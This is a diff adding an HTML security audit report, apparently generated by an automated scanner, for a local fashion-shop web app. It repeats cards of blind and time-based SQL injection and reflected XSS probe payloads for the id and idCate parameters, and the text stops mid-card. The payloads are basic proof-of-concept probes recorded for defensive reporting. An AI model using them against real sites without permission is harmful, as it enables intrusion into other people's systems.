@@ -1,0 +1,2087 @@
+
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<title>Security Audit Report</title>
+<style>
+    body {
+        font-family: 'Segoe UI', sans-serif;
+        margin: 40px;
+        background: #f4f6f8;
+    }
+    h1, h2, h3, h4 {
+        margin-top: 20px;
+    }
+    .header {
+        background: #2c3e50;
+        color: white;
+        padding: 25px;
+        border-radius: 10px;
+    }
+    .vuln-card {
+        background: white;
+        padding: 20px;
+        margin: 15px 0;
+        border-radius: 10px;
+        border-left: 6px solid #e74c3c;
+        box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+    }
+    table {
+        border-collapse: collapse;
+        width: 100%;
+        margin-top: 10px;
+    }
+    th, td {
+        border: 1px solid #ccc;
+        padding: 6px 10px;
+        font-size: 13px;
+    }
+    th {
+        background: #34495e;
+        color: white;
+    }
+    .data-box {
+        background: #ecf0f1;
+        padding: 15px;
+        border-radius: 6px;
+        font-family: Consolas, monospace;
+        margin-bottom: 15px;
+    }
+    .footer {
+        margin-top: 40px;
+        font-size: 12px;
+        color: #666;
+        text-align: center;
+    }
+</style>
+</head>
+<body>
+
+<div class="header">
+    <h1>Security Audit Report</h1>
+    <p><b>Mục tiêu:</b> http://localhost/qlthoitrang/</p>
+    <p><b>Thời gian:</b> 2025-12-21 23:50:09</p>
+</div>
+<h2>Danh sách lỗ hổng phát hiện</h2>
+<div class="vuln-card">
+    <h3>Blind SQLi (Boolean)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=15</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; AND &#x27;1&#x27;=&#x27;1</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=15</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=15</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=15</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (Time-based)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=15</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code> AND (SELECT 5 FROM PG_SLEEP(5))</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=15</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=15</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=15</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Blind SQLi (Boolean)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=7</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; AND &#x27;1&#x27;=&#x27;1</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=7</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=7</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=7</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Blind SQLi (Boolean)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=7</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; AND &#x27;1&#x27;=&#x27;1</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=7</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=7</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=7</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=6&amp;id=24</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=6&amp;id=24</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=6&amp;id=24</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (Time-based)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=6&amp;id=24</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27;; WAITFOR DELAY &#x27;0:0:5&#x27;--</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=6&amp;id=24</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=6&amp;id=24</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=6&amp;id=24</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=17</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=17</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=17</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=17</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=17</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=17</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Blind SQLi (Boolean)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=10</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; AND &#x27;1&#x27;=&#x27;1</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=10</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=10</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=10</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=10</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=10</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=10</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=18</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=18</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=18</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=18</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=18</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=18</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=6&amp;id=25</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=6&amp;id=25</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=6&amp;id=25</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (Time-based)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=6&amp;id=25</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27;; WAITFOR DELAY &#x27;0:0:5&#x27;--</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Blind SQLi (Boolean)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=6&amp;id=25</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; AND &#x27;1&#x27;=&#x27;1</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=6&amp;id=25</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=6&amp;id=25</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=6&amp;id=25</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Blind SQLi (Boolean)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=4</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; AND &#x27;1&#x27;=&#x27;1</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=4</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=4</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=4</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=4</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=4</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=4</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=4&amp;id=22</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=4&amp;id=22</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=4&amp;id=22</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (Time-based)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=4&amp;id=22</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27;; WAITFOR DELAY &#x27;0:0:5&#x27;--</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Blind SQLi (Boolean)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=4&amp;id=22</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; AND &#x27;1&#x27;=&#x27;1</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=4&amp;id=22</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=4&amp;id=22</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=4&amp;id=22</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=4&amp;id=20</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=4&amp;id=20</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=4&amp;id=20</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (Time-based)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=4&amp;id=20</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27;; WAITFOR DELAY &#x27;0:0:5&#x27;--</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Blind SQLi (Boolean)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=4&amp;id=20</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; AND &#x27;1&#x27;=&#x27;1</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=4&amp;id=20</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=4&amp;id=20</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=4&amp;id=20</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Blind SQLi (Boolean)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=3</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; AND &#x27;1&#x27;=&#x27;1</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=3</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=3</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=3</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
